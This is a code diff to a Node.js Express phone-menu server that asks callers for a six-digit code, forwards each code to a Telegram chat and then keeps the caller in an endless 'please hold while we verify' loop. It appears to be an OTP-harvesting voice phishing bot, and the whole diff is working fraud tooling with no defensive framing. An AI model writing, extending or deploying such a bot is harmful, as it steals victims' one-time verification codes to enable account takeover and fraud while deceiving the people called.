@@ -1,16 +1,36 @@
-const express = require("express");
-const bodyParser = require("body-parser");
+const express = require("express")
+const bodyParser = require("body-parser")
+const fetch = require("node-fetch")
 
-const app = express();
-app.use(bodyParser.urlencoded({ extended: false }));
+const app = express()
+app.use(bodyParser.urlencoded({ extended: false }))
 
-app.get("/", (req,res)=>{
-res.send("IVR server running");
-});
+const TELEGRAM_TOKEN="YOUR_BOT_TOKEN"
+const CHAT_ID="YOUR_CHAT_ID"
+
+let activeCall=null
+let lastCode=null
+
+async function sendTelegram(text){
+await fetch(`https://api.telegram.org/bot${TELEGRAM_TOKEN}/sendMessage`,{
+method:"POST",
+headers:{"Content-Type":"application/json"},
+body:JSON.stringify({
+chat_id:CHAT_ID,
+text:text
+})
+})
+}
+
+app.get("/",(req,res)=>{
+res.send("IVR server running")
+})
 
 app.all("/ivr",(req,res)=>{
 
-res.type("text/xml");
+activeCall=req.body.CallSid
+
+res.type("text/xml")
 
 res.send(`
 <Response>
@@ -18,38 +38,36 @@ res.send(`
 <Say>Please enter your six digit code</Say>
 </Gather>
 </Response>
-`);
-
-});
+`)
+})
 
 app.all("/code",(req,res)=>{
 
-const digits=req.body.Digits;
+const digits=req.body.Digits
+lastCode=digits
 
-console.log("Code received:",digits);
+sendTelegram(`📞 New Code Received\n\nCode: ${digits}`)
 
-res.type("text/xml");
+res.type("text/xml")
 
 res.send(`
 <Response>
-<Say>Thank you. Please stay on the line while we verify your request.</Say>
+<Say>Please hold while we verify.</Say>
 <Redirect>/hold</Redirect>
 </Response>
-`);
-
-});
+`)
+})
 
 app.all("/hold",(req,res)=>{
 
-res.type("text/xml");
+res.type("text/xml")
 
 res.send(`
 <Response>
 <Pause length="20"/>
 <Redirect>/hold</Redirect>
 </Response>
-`);
+`)
+})
 
-});
-
-app.listen(process.env.PORT || 3000);
+app.listen(process.env.PORT||3000)
